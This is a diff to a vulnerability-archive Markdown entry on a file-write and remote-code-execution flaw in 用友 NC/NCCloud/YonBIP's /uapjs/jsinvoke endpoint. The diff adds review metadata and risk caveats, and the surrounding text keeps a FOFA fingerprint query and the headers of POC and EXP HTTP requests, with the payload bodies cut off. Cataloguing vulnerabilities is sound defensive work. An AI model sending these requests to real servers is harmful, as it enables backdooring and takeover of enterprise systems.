@@ -1,11 +1,50 @@
 ---
-fofa: "指纹**"
 source: "MrWQ/vulnerability-paper"
+title: "用友NC/NCCloud/YonBIP jsinvoke saveXStreamConfig任意写入及JNDI链"
+product: "用友NC/NCCloud/YonBIP"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "NC63/633/65/NCC1903–2111/BIP2207"
+prerequisites: "带/不带session变体；JNDI依赖未列"
+side_effects: "在线解密或外部服务可能收到凭据及敏感内容"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/OO6GIKWm9ld05Vc2WQhkRg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC%20uapjs%20RCE%20%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "指纹**"
+id: "vw-d2a711147b9a8870fe268fee"
+entity_id: "ve-d2a711147b9a8870fe268fee"
+schema_version: "1"
 ---
 
-# 用友 NC uapjs RCE 漏洞
+# 用友NC/NCCloud/YonBIP jsinvoke saveXStreamConfig任意写入及JNDI链
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友NC/NCCloud/YonBIP；jsinvoke saveXStreamConfig任意写入及JNDI链
+- 版本、配置及部署条件：NC63/633/65/NCC1903–2111/BIP2207
+- 认证与权限前提：带/不带session变体；JNDI依赖未列
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 第一POC写12311纯文本只证写入，EXP另依赖EL/JNDI
+- 请求头体缺空行；EXP缺Content-Type，FOFA误取指纹标题
+- 同153等，第三方工具回显不是root cause；缺补丁，推广占半篇
+
+## 操作风险
+
+在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OO6GIKWm9ld05Vc2WQhkRg)
 
 用友 NC 及 NC Cloud 系统存在任意文件上传漏洞，攻击者可通过 uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给 NC 服务器预埋后门，从而可以随意操作服务器。
@@ -20,7 +59,7 @@ app="用友 - NC-Cloud"
 
 **POC**
 
-```
+```http
 POST /uapjs/jsinvoke?action=invoke HTTP/1.1
 Host: XXXXX
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
@@ -28,7 +67,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: cookiets=1689835770151; JSESSIONID=2BEFF983D118B58B579F45C703152075.server
+Cookie: cookiets=1689835770151; JSESSIONID=2*************************************r
 Upgrade-Insecure-Requests: 1
 If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
 If-None-Match: W/"1571-1589211696000"
@@ -44,7 +83,7 @@ Content-Length: 178
 
 **EXP**
 
-```
+```http
 POST /uapjs/jsinvoke?action=invoke HTTP/1.1
 Host: xxxx
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
